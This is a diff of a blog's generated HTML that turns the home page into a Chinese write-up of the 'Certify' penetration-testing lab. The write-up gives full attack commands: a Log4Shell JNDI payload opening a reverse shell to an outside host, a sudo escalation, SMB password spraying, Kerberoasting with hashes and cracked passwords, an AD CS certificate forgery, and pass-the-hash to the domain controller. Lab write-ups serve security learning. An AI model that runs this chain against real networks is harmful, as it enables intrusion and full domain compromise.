@@ -17,15 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>xiaofuc's Blog</title>
+  <title>春秋云镜-Certify - xiaofuc's Blog</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="xiaofuc&#39;s Blog">
-<meta property="og:url" content="http://example.com/">
+    <meta name="description" content="外网打点fscan扫一下： 有一个solr页面，而且有Log4j Log4Shell验证成功： 1http:&#x2F;&#x2F;39.99.159.154:8983&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;i8nw97.dnslog.cn&#125;    服务器上先用JNDI-Exploit起一个服务，并监听端口： 12java -jar JNDIExploit.j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Certify">
+<meta property="og:url" content="http://example.com/2025/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/">
 <meta property="og:site_name" content="xiaofuc&#39;s Blog">
+<meta property="og:description" content="外网打点fscan扫一下： 有一个solr页面，而且有Log4j Log4Shell验证成功： 1http:&#x2F;&#x2F;39.99.159.154:8983&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;i8nw97.dnslog.cn&#125;    服务器上先用JNDI-Exploit起一个服务，并监听端口： 12java -jar JNDIExploit.j">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg">
+<meta property="article:published_time" content="2025-10-15T09:21:57.000Z">
+<meta property="article:modified_time" content="2025-10-15T11:38:41.959Z">
 <meta property="article:author" content="xiaofuc">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg">
@@ -46,12 +50,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"http://example.com","author":{"@type":"Person","name":"xiaofuc","sameAs":[],"image":"https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg"},"name":"xiaofuc's Blog","description":"","url":"http://example.com"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"xiaofuc","sameAs":[],"image":"https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg"},"dateCreated":"2025-10-15T17:21:57+08:00","dateModified":"2025-10-15T19:38:41+08:00","datePublished":"2025-10-15T17:21:57+08:00","description":"","headline":"春秋云镜-Certify","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/"},"publisher":{"@type":"Organization","name":"xiaofuc","sameAs":[],"image":"https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg","logo":{"@type":"ImageObject","url":"https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg"}},"url":"http://example.com/2025/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/","image":[]}</script>
   <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="undefined" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">xiaofuc's Blog</div><div class="sub cap">岁月静好</div></a></div></header>
@@ -63,34 +67,136 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+
+
 <widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/"><span class="title">春秋云镜-Certify</span></a><a class="item title" href="/2025/10/14/%E6%89%93%E8%B5%A2%E5%A4%8D%E6%B4%BB%E8%B5%9B%E4%BA%86/"><span class="title">打赢复活赛了</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://youke1.picui.cn/s1/2025/10/14/68ee355726a90.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">xiaofuc's Blog</div><div class="sub cap">岁月静好</div></a></div></header>
 
 
 
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a class="active" href="/">近期发布</a><a href="/tags/">标签</a><a href="/archives/">归档</a></nav></div></div></div>
-<div class="post-list post"><a class="post-card post" href="/2025/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/">
-<article class="md-text"><h2 class="post-title">春秋云镜-Certify</h2><div class="excerpt"><p>外网打点fscan扫一下：
-有一个solr页面，而且有Log4j
-Log4Shell验证成功：
-1http://39.99.159.154:8983/solr/admin/cores?action=$&#123;jndi:ldap://i8nw97....</p></div><div class="meta cap"><span class="cap" id="post-meta"><svg style="margin-bottom:2px" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M6.94 2c.416 0 .753.324.753.724v1.46c.668-.012 1.417-.012 2.26-.012h4.015c.842 0 1.591 0 2.259.013v-1.46c0-.4.337-.725.753-.725s.753.324.753.724V4.25c1.445.111 2.394.384 3.09 1.055c.698.67.982 1.582 1.097 2.972L22 9H2v-.724c.116-1.39.4-2.302 1.097-2.972c.697-.67 1.645-.944 3.09-1.055V2.724c0-.4.337-.724.753-.724"/><path fill="currentColor" d="M22 14v-2c0-.839-.004-2.335-.017-3H2.01c-.013.665-.01 2.161-.01 3v2c0 3.771 0 5.657 1.172 6.828C4.343 22 6.228 22 10 22h4c3.77 0 5.656 0 6.828-1.172C22 19.658 22 17.772 22 14" opacity=".5"/><path fill="currentColor" d="M18 17a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m-5 4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m-5 4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><time datetime="2025-10-15T09:21:57.000Z">2025-10-15</time></span></div></article>
-</a><a class="post-card post" href="/2025/10/14/%E6%89%93%E8%B5%A2%E5%A4%8D%E6%B4%BB%E8%B5%9B%E4%BA%86/">
-<article class="md-text"><div class="post-cover"><img src="https://youke1.picui.cn/s1/2025/10/15/68ef6444dcde9.png"/></div><h2 class="post-title">打赢复活赛了</h2><div class="excerpt"><p>复活了My blog 复活了！
-由于之前我github两步验证的码没保存，弄了半天还是修不好，放弃了。。之前的东西都无了 
-一些近况今天是2025.10.14下午3点，有点困了，无聊写点东西记录记录最近的事情。
-从九月十号左右就开始投简历找实习了，一...</p></div><div class="meta cap"><span class="cap" id="post-meta"><svg style="margin-bottom:2px" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M6.94 2c.416 0 .753.324.753.724v1.46c.668-.012 1.417-.012 2.26-.012h4.015c.842 0 1.591 0 2.259.013v-1.46c0-.4.337-.725.753-.725s.753.324.753.724V4.25c1.445.111 2.394.384 3.09 1.055c.698.67.982 1.582 1.097 2.972L22 9H2v-.724c.116-1.39.4-2.302 1.097-2.972c.697-.67 1.645-.944 3.09-1.055V2.724c0-.4.337-.724.753-.724"/><path fill="currentColor" d="M22 14v-2c0-.839-.004-2.335-.017-3H2.01c-.013.665-.01 2.161-.01 3v2c0 3.771 0 5.657 1.172 6.828C4.343 22 6.228 22 10 22h4c3.77 0 5.656 0 6.828-1.172C22 19.658 22 17.772 22 14" opacity=".5"/><path fill="currentColor" d="M18 17a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m-5 4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m-5 4a1 1 0 1 1-2 0a1 1 0 0 1 2 0m0-4a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><time datetime="2025-10-14T07:14:37.000Z">2025-10-14</time></span></div></article>
-</a></div>
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-10-15T09:21:57.000Z">2025-10-15</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-10-15T11:38:41.959Z">2025-10-15</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>春秋云镜-Certify</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>fscan扫一下：<br><img src="/images/Certify/Pasted%20image%2020251012144956.png"></p>
+<p>有一个solr页面，而且有Log4j<br><img src="/images/Certify/Pasted%20image%2020251012145034.png"></p>
+<p>Log4Shell验证成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.159.154:8983/solr/admin/cores?action=$&#123;jndi:ldap://i8nw97.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/Certify/Pasted%20image%2020251012145300.png"></p>
+<p>服务器上先用JNDI-Exploit起一个服务，并监听端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit.jar -i IP</span><br><span class="line">nc -lvnp 80</span><br></pre></td></tr></table></figure>
+
+<p>Log4j2 Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://114.132.61.17:1389/Basic/ReverseShell/114.132.61.17/80&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到shell：<br><img src="/images/Certify/Pasted%20image%2020251012150257.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Certify/Pasted%20image%2020251012150512.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo grc --pty /bin/sh</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>读取第一个flag：<br><img src="/images/Certify/Pasted%20image%2020251012150746.png"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>证明机器出网，也可以用<code>curl ip.sb</code><br><img src="/images/Certify/Pasted%20image%2020251012150807.png"></p>
+<p><img src="/images/Certify/Pasted%20image%2020251012150836.png"><br><code>172.22.9.19</code></p>
+<p>上传fscan，挂代理，这里略。<br>可以看到还有三台机子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.7</span><br><span class="line">.26</span><br><span class="line">.47   fileserver</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB共享登录"><a href="#SMB共享登录" class="headerlink" title="SMB共享登录"></a>SMB共享登录</h2><p>47是台fileserver，试一试SMB登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbclient 172.22.9.47</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012152902.png"></p>
+<p>flag02在其中，还能够dump下来一个.db文件：<br><img src="/images/Certify/Pasted%20image%2020251012153037.png"></p>
+<p>用Navicat打开：（这里应该dump name字段而非email!）<br><img src="/images/Certify/Pasted%20image%2020251012154102.png"></p>
+<p><img src="/images/Certify/Pasted%20image%2020251012154218.png"></p>
+<p>单独列出来一份user.txt和pass.txt，准备SMB爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec smb 172.22.9.26 -u user.txt -p pass.txt --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012154901.png"></p>
+<p>爆破出来两个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangjian:i9XDE02pLVf</span><br><span class="line">xiaorang.lab\liupeng:fiAzGwEMgTY </span><br></pre></td></tr></table></figure>
+<p>但是都登录不上rdp。</p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h2><p>根据flag2的提示，与SPN有关，要打kerberoasting</p>
+<p>查一下有没有域用户的spn：（用zhangjian用户）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/Certify/Pasted%20image%2020251012155159.png"><br>已经确认了 zhangxia 和 chenchen 这两个用户账户是可以被“Kerberoast”的。</p>
+<p>我们还dump到zhangxia和chenchen的两个哈希值：<br>这里的哈希值是用对应用户的<u>NTLM哈希值</u>为密文，<u>ST</u> [[Kerberos协议#基础概念]] 为明文的方式，加密而来的密文。<br>加密算法是<u>对称加密</u>，故我们可以对密文进行离线爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$63e2b10756ceff8fffe75823dbc48714$7976b1930ad8b3113c6ba1e0ce0039f1cf97431ce84694aa810ed7215e4f3b3eaae8895ffbff0736e40163dfc4b4efc17c1180ba8aab1d4ba051220b8255cea8766b6e6819f965c449f9dd8d51bc322ef3cc6f675ad9d5c30ddf6f73849c5ea53e68be26670dc02fd59a360bf6d6299ddc89030b964960a963befb3e17d8af2a7970d54967b770913184607ca60c3d021cceae99a1dd043a04080300a27abf5737dd24b807397c564ab91201da703e404e13dd2b5ec02ef45382c1c467585afc0b79a63ccf642835e0753a1e395b15bf177ab93604b1228de1f8d8c910c365f3afaf777546af09dd21f7b388f2b9b55888e6fdc51b2ce1ad12ad8f1331c0cbb395ee99ad31c431cc3b84376e69c24eb685099bfff060d5fdff972d8a76d2f4f292f8490eab00dc6818c5aca45d7364a83ccadd25d6e91beadec4ae00173b1818a8e3ff86626a1a0cf2477d234077e82f26a9cf33088e8b207d58b7671f2f414ec47924e67c06042a98542dd617623f03558a43b986e76c37adb53c9b2d64be4c4239ab5ffa4669c595c205fe020e61a8a03f3cd529294db58fadaeb5c4aa7c5072ad2dfc24fed5cc577eae5cc6433474f9a6796e6b359cda5a4fb4e0379d124c0e107aa6ca0332396dabf2e472054ec764971b506fe2951e231eae25d9c8f02af062e3dd1ccc99477ff2e431aae735f4f2da2fd1a817ff8102fd87055de7279bd5319f7bd8ca0bd6c46f11f487ac08deac215c8f2d7c63030d757171f2b076aa1f0b397e3fff106146e978c8ac6e278260d1ddd88777b1a3de21c077f46878d342352c7f075fe06a5e2dd7562b60b505072f6a910d6e8f94886dd1ecffa560ee18b3a1f479bacc1b906bdd6bbb9e9f4dea5cad23f5530d4eeff1c5544d19f13f6d9a6541034ebad9129626ebd1fbd25be76c628d3f780981fe6a7bd61c0249b9295dfdd45a7704e819a62b39f1879043df7b18c49a7f7da04eab525f388c5131c09964052e95073d17715fbd1a686210a455c0a147741ee27b47e7d21946f7e6e5664bfcdc9205bcfb25ed93deb00c22812e726fd9ecddb4be3829f6f970de6dfa2488be0d871929f0cb1b5ea24aa9e3be78a77b963eb2923ad3453b01bbcadfab1ce8b0d9190d9ec03bb041bbf48f35c49d150d2b6b1118ea248fc9e005c6b19fead5e62e6694345fc4d80b6329271a940f53cde8075f5e803231490bd219aea25224b1eab4ce2d3b88b7a526b2970e2e0167589a3a769ced716af1e77697dce067753d25652a80a045df08385c8797d03d1805fe1dad80f9666bec50860b3b8e6172318ceed32bacc7cc234fe1f080239db0d3026651c2336657045a4de355fb48ebc107916fc8a2cead667e66884cf8bced76dafc320ed8af5248cd84a7b9c0b4dc3555b30caf550f254d550d7f47cee021b7019ed9336509281e8da316c75c10d3bea9f9213b234f5a59db9732b7b6d314b8cf74fa2582173e8cbf8c62ad24ea29046b5d76cd029d008eed7f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$c6e65922c9f0a70160ef6de693090e2d$a9f8d961bd4234ab1d9c297c6bf89a638046913da23ce803a48e421ab9e83536139b181976f3b8aa8756aaa1d0b054bb6679cdd3efd12a1d7d429823ecf47b07add4cf6a9d83bf02fd97580238013dc7b34b518e6d8f08f6c5a5a379e8840e980cab486106879fc428ab3ee686ce826dced39248ceefb738d5ebfc1657760930dc7ca4673ed5bfd513c1fd25abd00cf5c88d7d832a89d7d73e5f9715337145eb37571daef8bed382268502018f46711a8d0c72a0ea1aff65b1e7e8cddbc57184b6210979a406e38219645a7d6262093f4d6b5a2cdd0d5b593e83592695b121d3aa3bd91a3d5425f06c34ff00654f1184d478aacc1ccb64d8a99a86761397a707b82038d250f5659fd84671073b7170c561fed642e00e20a91ac6fc67ac56055e9360496e041225676840abbffdb85e94fb5fdb7347f85820ed2caa0e6b432c6762c77cc84c834d1a65d98485b706129d6e97b31d622b1522d9f14d5ecb8ee4d4308d42e9fa703d9186ec992ef99ffcf5a3343669e498f49750c928f302cc75b797c820196dfa6e51a1a395105e5b52b770e099409d7dcedbd4bf47deb086e3c62a287dc38838ba1f89c8ce3cdec88dcaa87fbe8801a8ff4d68fdb8ca34662648c5541549f7b366fc277bd0a2891beba5c237c110df778607ba098d696b41806895394b4f0260cca2d1f19cadc65c378553be1a8ba3b26e6e59d09a3c48e8db06d1b7f866d3cef80401c4594c637fa0d27b1bac7a6c088bf5fe094d183531736e65a9152903b92cffccbe18451456cc82653f55b8a69fd98a510bd47528fdb5197e42175e36181a7bc02e90edae3197be89df49a23f440a7fd2ebae1e857b742cea5f0214dfaf8ed98bb6d8303c2c9e06c5cebeef161003791622a3e0a1f15a6d00ecb75e940aab5fe859bb6d506d52357ad97a4f92f22caa8b6fd3679f46f7f4aba224b3ffd123685c84c25e089ba4f2237332fd58343d227a6fbd8ab8b403560f4b276c27526b761fbe53f121fee178a59eb157fd95eda59c21a6af6e608d9d89d3b7d9c636f2934942e845842fd9bf50b2eeb7dd68dd6ff305efbae34dbc8a1d5f30545fe267dbd2ee7625d653698e7d14135c182a0fd462c5d47248bf7ed9a26254f0f272e420edac6477f3bd8f9072c84a3a3c8c9a5b236805d61feb2e166522370bb60e5dd2f4ee372df47a3c3824f1f641d2d4960205bdb9e6eaa0c6f6f9fc540903dd6968f1018bd024784432ffa1aae02804cbcc180285f2c070daff261fc631719dfaa0825550dc3bce6608e54c4adc165fcb9672cb6fbaeb136837201dfe030c89ff5a06de70b673352ba8e309ef67c3e5a2d00c959c943f61be8c67cf78b47445676114ce3b7cb0cd64a439d714155330d1cd41c4536107f9308b7bee3f018d22e0ecbbcda23ae41290c30a802650f9450951665b7893f45b780c4b515fd7c2b11e275a6dabe40e3e2800e5990986f66cd3415c379b6efe86de5cfbf703027184737be1e251427a30</span><br></pre></td></tr></table></figure>
+
+<p>用hashcat分别进行破解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 zhangxia.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia/MyPass2@@6</span><br><span class="line">chenchen/@Passw0rd@</span><br></pre></td></tr></table></figure>
+
+<p>查看用户的证书情况：(这行命令是在执行一次针对 <strong>Active Directory 证书服务 (AD CS)</strong> 的<strong>安全审计和漏洞发现</strong>。)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u &#x27;zhangxia@xiaorang.lab&#x27;  -password &#x27;MyPass2@@6&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012160102.png"></p>
+<p>修改&#x2F;etc&#x2F;hosts，避免超时：<br>这里我不懂具体要怎么改。。<br>这里需要加上域控的名字.xiaorang.lab<br>这个名字在fscan扫除的&#x2F;右边（我图忘记粘贴，环境已经关了。。）</p>
+<p>用RDP进行登录：<br>注意用户名要加上<code>@xiaorang.lab</code></p>
+<p>又好了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;zhangxia@xiaorang.lab&#x27; -p &#x27;MyPass2@@6&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#x27;xiaorang-XIAORANG-DC-CA&#x27; -template &#x27;XR Manager&#x27; -upn &#x27;administrator@xiaorang.lab&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012162154.png"></p>
+<p>拿到生成的administrator.pfx可以获取域管哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012162444.png"></p>
+<p>拿到域管哈希<code>2f1b57eefb2d152196836b0516abea80</code>，后面直接PTH即可：<br>flag3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Certify/Pasted%20image%2020251012162556.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>
+
+<p>flag4：登录到DC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Certify/Pasted%20image%2020251012162734.png"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/10/14/%E6%89%93%E8%B5%A2%E5%A4%8D%E6%B4%BB%E8%B5%9B%E4%BA%86/">打赢复活赛了</a></div></section></div>
+
+
+
+
 
 
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">xiaofuc</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E5%85%B1%E4%BA%AB%E7%99%BB%E5%BD%95"><span class="toc-text">SMB共享登录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">kerberoasting攻击</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
